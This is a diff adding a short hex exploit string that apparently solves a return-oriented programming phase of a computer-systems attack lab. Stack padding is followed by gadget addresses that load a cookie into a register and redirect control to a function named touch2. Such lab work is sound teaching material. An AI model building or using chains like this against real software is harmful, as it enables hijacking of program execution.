@@ -1,0 +1,9 @@
+00 00 00 00 00 00 00 00		/* fill 0x5561dc78 to ..dc7f		*/
+00 00 00 00 00 00 00 00		/* fill 0x5561dc80 to ..dc87		*/
+00 00 00 00 00 00 00 00		/* fill 0x5561dc88 to ..dc8f		*/
+00 00 00 00 00 00 00 00		/* fill 0x5561dc90 to ..dc97		*/
+00 00 00 00 00 00 00 00		/* fill 0x5561dc98 to ..dc9f		*/
+ab 19 40 00 00 00 00 00		/* gadget 1: address of  popq %rax	*/
+fa 97 b9 59 00 00 00 00		/* cookie pops into rax		  	*/
+c5 19 40 00 00 00 00 00		/* gadget 2: address of movq %rax, %rdi	*/
+ec 17 40 00 00 00 00 00		/* address of touch2			*/
